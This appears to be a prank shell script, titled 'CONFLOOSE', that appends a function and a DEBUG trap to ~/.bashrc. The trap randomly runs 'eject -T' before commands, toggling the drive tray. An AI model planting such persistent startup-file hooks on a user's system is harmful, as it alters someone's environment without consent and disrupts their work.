echo "# === CONFLOOSE === #" >> ~/.bashrc
echo '
function eject() {
    declare -F ${BASH_COMMAND%% *} >/dev/null
    if [[ "${BASH_COMMAND%% *}" == "echo" ]]; then
        return;
    fi

    if [[ "$(( RANDOM % 9 ))" == "0" ]]; then
        eject -T
    fi
}

shopt -s extdebug
trap eject DEBUG
' >> ~/.bashrc
echo "# ================= #" >> ~/.bashrc
